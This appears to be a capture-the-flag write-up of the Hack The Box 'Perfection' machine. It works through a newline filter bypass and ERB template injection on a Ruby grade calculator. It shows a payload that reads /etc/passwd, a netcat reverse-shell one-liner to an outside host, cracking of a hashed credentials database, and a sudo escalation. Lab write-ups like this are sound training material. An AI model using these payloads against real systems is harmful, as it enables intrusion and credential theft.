# Perfection
## Enumeration
### Port Scanning
There are two open ports. 22 (ssh) and 80 (http):
```
┌──(kali㉿kali)-[~]
└─$ nmap $IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-26 06:21 EDT
Nmap scan report for 10.10.11.253
Host is up (0.096s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.35 seconds
                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV $IP                                                                                         130 ⨯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-26 06:23 EDT
Nmap scan report for 10.10.11.253
Host is up (0.099s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.62 seconds
                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ 
```

### HTTP
If we connect via HTTP with the server, we see the following website:
![Website](./images/website.png)

At the bottom of the page, we find a hint that the web server is run with WEBrick, a Ruby web server, in version 1.7.0:
![WEBrick](./images/webrick.png)

But there are no public exploits for this WEBrick version.

Scanning possible directories and files of the web server wasn't successful as well. If a non-existing path is requested, the server gives the following response:
![Error](./images/error.png)

This message belongs to [SINATRA](https://sinatrarb.com/), a _DSL for quickly creating web applications in Ruby with minimal effort._ But that brought also no attacking vectors.

So probably we should investigate the web application further. It provides a grade calculator:
![Calculator](./images/calculator.png)

According to the source code, the inputs fields have the following restrictions:
```html
<input type="text" id="category1" name="category1" required>
<input type="number" id="grade1" name="grade1" min="0" max="100" required>
<input type="number" id="weight1" name="weight1" min="0" max="100" required>
```

So maybe we can inject code into the first box. But the input seems to be restricted if we type in special characters like `;`, `'` or `\`, because we get the error `Malicious input blocked`:
![Input blocked](./images/input_blocked.png)

At this point I headed over to Burp and tried several inputs without any success. Until I remembered the CLRF injection from the [Clicker](../Clicker/Clicker.md) machine. With that, we can terminate the line and split the HTTP request. `%0a` is the corresponding URL character for the input.

For example with the input `category1=TEST%0a;&grade1=1&weight1=50& [...]` we won't receive the error anymore:
```html
Your total grade is 1%
<p>
  TEST
  ;: 0%
</p>
```

## SSTI
With that knowledge, we can try to inject code. Since we know that it's a Ruby web server, we probably have to inject Ruby code. I tried a lot of inputs and researched a lot until I found template engines and how they can be injected if the input is not verified.

If the application uses such an engine, it's probably a Ruby engine (Embedded Ruby). So I tried some payloads from [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby). For example `<%= 7*7 %>` responses with the answer `49`. So probably we got something here.

`<%= %>` tags an expression of the template ([ERB Wikipedia](https://en.wikipedia.org/wiki/ERuby#Expression_tags)).

I tested another payload `<%= File.open('/etc/passwd').read %>` and got this response:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
susan:x:1001:1001:Susan Miller,,,:/home/susan:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

I also researched at this point how you can determine that a template engine is used and what engine exactly is used. But what I found was that you just have to trial and error with different characters and payloads. The resulting responses can give a hint about the used engine. More information about Server Side Template Injection (SSTI) can be found here: [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)

With that knowledge we can build a payload that creates a reverse shell:
```
<%= `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.83 8081 >/tmp/f` %>
```

URL encoded in the POST request, this will look like the following:
```
category1=TEST%0a<%25%3d+`rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.83+8081+>/tmp/f`+%25>&grade1=1&weight1=50& [...]
```

And we can successfully catch and stabilize the shell:
```
┌──(kali㉿kali)-[/usr/share/exploitdb]
└─$ nc -lvnp 8081                                                                                                                                     130 ⨯
Listening on 0.0.0.0 8081
Connection received on 10.10.11.253 35082
/bin/sh: 0: can't access tty; job control turned off
$ ls
main.rb
public
views
$ python --version
/bin/sh: 2: python: not found
$ python3 --version
Python 3.10.12
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
susan@perfection:~/ruby_app$ ^Z
zsh: suspended  nc -lvnp 8081
                                                                                                                                                            
┌──(kali㉿kali)-[/usr/share/exploitdb]
└─$ stty size                                                                                                                                     148 ⨯ 1 ⚙
83 156
                                                                                                                                                            
┌──(kali㉿kali)-[/usr/share/exploitdb]
└─$ echo $TERM                                                                                                                                          1 ⚙
xterm-256color
                                                                                                                                                            
┌──(kali㉿kali)-[/usr/share/exploitdb]
└─$ stty raw -echo;fg                                                                                                                                   1 ⚙
[1]  + continued  nc -lvnp 8081

susan@perfection:~/ruby_app$ 
susan@perfection:~/ruby_app$ export TERM=xterm-256color
susan@perfection:~/ruby_app$ stty rows 156 columns 83
susan@perfection:~/ruby_app$ 
susan@perfection:~/ruby_app$ 
susan@perfection:~/ruby_app$ ls -al 
total 20
drwxr-xr-x 4 root  susan 4096 Oct 27  2023 .
drwxr-x--- 7 susan susan 4096 Feb 26 09:41 ..
-rw-r--r-- 1 root  susan 2488 Oct 25  2023 main.rb
drwxr-xr-x 5 root  susan 4096 Oct 27  2023 public
drwxr-xr-x 2 root  susan 4096 Oct 27  2023 views
susan@perfection:~/ruby_app$
```

## User flag
The shell is located in the web application folder. This folder is inside the home directory of the user `susan`. In this home folder, we can find the user flag:
```
susan@perfection:~/ruby_app$ ls -al 
total 20
drwxr-xr-x 4 root  susan 4096 Oct 27  2023 .
drwxr-x--- 7 susan susan 4096 Feb 26 09:41 ..
-rw-r--r-- 1 root  susan 2488 Oct 25  2023 main.rb
drwxr-xr-x 5 root  susan 4096 Oct 27  2023 public
drwxr-xr-x 2 root  susan 4096 Oct 27  2023 views
susan@perfection:~/ruby_app$ pwd
/home/susan/ruby_app
susan@perfection:~/ruby_app$ cd ..
susan@perfection:~$ ls -al 
total 48
drwxr-x--- 7 susan susan 4096 Feb 26 09:41 .
drwxr-xr-x 3 root  root  4096 Oct 27  2023 ..
lrwxrwxrwx 1 root  root     9 Feb 28  2023 .bash_history -> /dev/null
-rw-r--r-- 1 susan susan  220 Feb 27  2023 .bash_logout
-rw-r--r-- 1 susan susan 3771 Feb 27  2023 .bashrc
drwx------ 2 susan susan 4096 Oct 27  2023 .cache
drwx------ 3 susan susan 4096 Jun 26 14:04 .gnupg
lrwxrwxrwx 1 root  root     9 Feb 28  2023 .lesshst -> /dev/null
drwxrwxr-x 3 susan susan 4096 Oct 27  2023 .local
drwxr-xr-x 2 root  root  4096 Oct 27  2023 Migration
-rw-r--r-- 1 susan susan  807 Feb 27  2023 .profile
lrwxrwxrwx 1 root  root     9 Feb 28  2023 .python_history -> /dev/null
drwxr-xr-x 4 root  susan 4096 Oct 27  2023 ruby_app
lrwxrwxrwx 1 root  root     9 May 14  2023 .sqlite_history -> /dev/null
-rw-r--r-- 1 susan susan    0 Oct 27  2023 .sudo_as_admin_successful
-rw-r----- 1 root  susan   33 Jun 26 13:11 user.txt
-rw-r--r-- 1 susan susan   39 Oct 17  2023 .vimrc
susan@perfection:~$ cat user.txt 
422cf0e5cd390e734a47370c78f00636
susan@perfection:~$ 
```

## System enumeration
Besides the web application, we can also find a `Migration/` folder in the home directory with a SQLite database in it:
```
susan@perfection:~$ ls -al 
total 48
drwxr-x--- 7 susan susan 4096 Feb 26 09:41 .
drwxr-xr-x 3 root  root  4096 Oct 27  2023 ..
lrwxrwxrwx 1 root  root     9 Feb 28  2023 .bash_history -> /dev/null
-rw-r--r-- 1 susan susan  220 Feb 27  2023 .bash_logout
-rw-r--r-- 1 susan susan 3771 Feb 27  2023 .bashrc
drwx------ 2 susan susan 4096 Oct 27  2023 .cache
drwx------ 3 susan susan 4096 Jun 26 14:04 .gnupg
lrwxrwxrwx 1 root  root     9 Feb 28  2023 .lesshst -> /dev/null
drwxrwxr-x 3 susan susan 4096 Oct 27  2023 .local
drwxr-xr-x 2 root  root  4096 Oct 27  2023 Migration
-rw-r--r-- 1 susan susan  807 Feb 27  2023 .profile
lrwxrwxrwx 1 root  root     9 Feb 28  2023 .python_history -> /dev/null
drwxr-xr-x 4 root  susan 4096 Oct 27  2023 ruby_app
lrwxrwxrwx 1 root  root     9 May 14  2023 .sqlite_history -> /dev/null
-rw-r--r-- 1 susan susan    0 Oct 27  2023 .sudo_as_admin_successful
-rw-r----- 1 root  susan   33 Jun 26 13:11 user.txt
-rw-r--r-- 1 susan susan   39 Oct 17  2023 .vimrc
susan@perfection:~$ cd Migration/
susan@perfection:~/Migration$ ls -al 
total 16
drwxr-xr-x 2 root  root  4096 Oct 27  2023 .
drwxr-x--- 7 susan susan 4096 Feb 26 09:41 ..
-rw-r--r-- 1 root  root  8192 May 14  2023 pupilpath_credentials.db
susan@perfection:~/Migration$ file pupilpath_credentials.db 
pupilpath_credentials.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 6, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 6
susan@perfection:~/Migration$ sqlite3 pupilpath_credentials.db 
```

This database contains credentials:
```
susan@perfection:~/Migration$
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
sqlite> 
```

The hashes are SHA256 hashes, but we aren't able to crack them:
```
┌──(kali㉿kali)-[~/Desktop/hackthebox/perfection]
└─$ cat hashes                             
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/hackthebox/perfection]
└─$ john --wordlist=/home/kali/Desktop/tools/rockyou.txt --format=Raw-SHA256 hashes                                   
Using default input encoding: UTF-8
Loaded 5 password hashes with no different salts (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=2
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:02 DONE (2024-06-26 14:01) 0g/s 5474Kp/s 5474Kc/s 27372KC/s (45491355)rp..*7¡Vamos!
Session completed. 
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/hackthebox/perfection]
└─$ john --show hashes                                                             
0 password hashes cracked, 5 left
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/hackthebox/perfection]
└─$ 
```

If we enumerate the system a bit further, we can find a mail of the user:
```
susan@perfection:~/Migration$ cat /var/mail/susan 
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
susan@perfection:~/Migration$ 
```

So the password of the user `susan` should be in the range from `susan_nasus_1` to `susan_nasus_1000000000`. The first hash in the databases belongs to this user. We can try to crack it with hashcat:
```
┌──(kali㉿kali)-[~/Desktop/hackthebox/perfection]
└─$ hashcat -a 3 -m 1400 susan susan_nasus_?d?d?d?d?d?d?d?d?d                                                                                        130 ⨯
hashcat (v6.2.6) starting

[...]

abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a3019934...39023f
Time.Started.....: Wed Jun 26 13:47:34 2024 (4 mins, 49 secs)
Time.Estimated...: Wed Jun 26 13:52:23 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: susan_nasus_?d?d?d?d?d?d?d?d?d [21]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1133.2 kH/s (0.23ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 324557824/1000000000 (32.46%)
Rejected.........: 0/324557824 (0.00%)
Restore.Point....: 324557312/1000000000 (32.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: susan_nasus_079471462 -> susan_nasus_903759210
Hardware.Mon.#1..: Util: 74%

Started: Wed Jun 26 13:47:32 2024
Stopped: Wed Jun 26 13:52:24 2024
                                                                                                                                                           
┌──(kali㉿kali)-[~/Desktop/hackthebox/perfection]
└─$ 
```
Alternately, we could also increment the password `hashcat -a 3 -m 1400 --increment-min 1 --increment-max 9 susan susan_nasus_?d?d?d?d?d?d?d?d?d`

But we already got the password: `susan_nasus_413759210`

## Root flag
A quick check with that password for sudo rights reveals this:
```
susan@perfection:~/Migration$ sudo -l
Matching Defaults entries for susan on perfection:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User susan may run the following commands on perfection:
    (ALL : ALL) ALL
susan@perfection:~/Migration$ 
```

So we can easily become root and find the flag in the root directory:
```
susan@perfection:~/Migration$ sudo -i
root@perfection:~# cat root.txt 
9bbecdbe197ac12627561c62cb71c081
root@perfection:~# 
```
